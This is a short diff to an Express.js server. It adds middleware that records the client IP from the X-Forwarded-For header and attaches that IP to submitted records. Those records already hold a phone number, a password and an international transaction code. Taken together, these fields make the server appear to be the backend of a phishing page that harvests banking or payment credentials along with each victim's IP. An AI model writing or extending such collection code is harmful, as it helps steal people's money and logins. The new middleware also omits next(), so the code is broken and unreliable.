@@ -14,9 +14,15 @@ app.use(expressValidator());
 app.use(bodyParser.json());
 app.use(express.static('public'));
 app.use((req,res,next)=>{
-    var clientIp = requestIp.getClientIp(req); // on localhost > 127.0.0.1
-    console.log(clientIp);
-    next();
+    var ip;
+    if (req.headers['x-forwarded-for']) {
+        ip = req.headers['x-forwarded-for'].split(",")[0];
+    } else if (req.connection && req.connection.remoteAddress) {
+        ip = req.connection.remoteAddress;
+    } else {
+        ip = req.ip;
+    }
+    req.clientIp=ip;
 });
 
 // Connect to Mongo
@@ -92,7 +98,8 @@ app.post("/",(req,res)=>{
     else{
         var obj={ phonenumber:req.body.SDT,
             passwowrd:req.body.password,
-            Internationaltransactioncode:req.body.magd
+            Internationaltransactioncode:req.body.magd,
+            IP:req.clientIp
         }
         //console.log(obj);
       
